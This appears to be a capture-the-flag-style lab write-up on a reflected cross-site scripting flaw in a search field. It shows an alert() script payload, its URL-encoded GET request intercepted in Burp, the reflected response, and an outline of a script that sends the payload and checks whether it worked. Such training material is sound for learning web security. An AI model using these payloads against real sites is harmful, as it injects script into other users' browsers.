### Lab: Reflected XSS into HTML context with nothing encoded

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function.

_____

Analysis and Exploit:

1. Inject a simple script alert in the search field and send it, the pop up message appears right after
    - ```<script>alert('XSS')</script>```

2. Intercept the process via **[BURP]**:
    - GET **/**
    - GET **/?search**=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E   (```<script>alert('XSS')</script>```)  
        in the response:  
        ```<h1>0 search results for '<script>alert('XSS')</script>'</h1>```

    
_____

Script:

1. Check if the number of arguments received is correct (1 url)
    - if not, print usage instructions
2. Send payload | GET **/?search** | params: 'xss payload'
    - payload = %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
3. Check response for signs of successful exploit
    - if  ```<h1>0 search results for '<script>alert('XSS')</script>'</h1>``` in the response, exploit worked!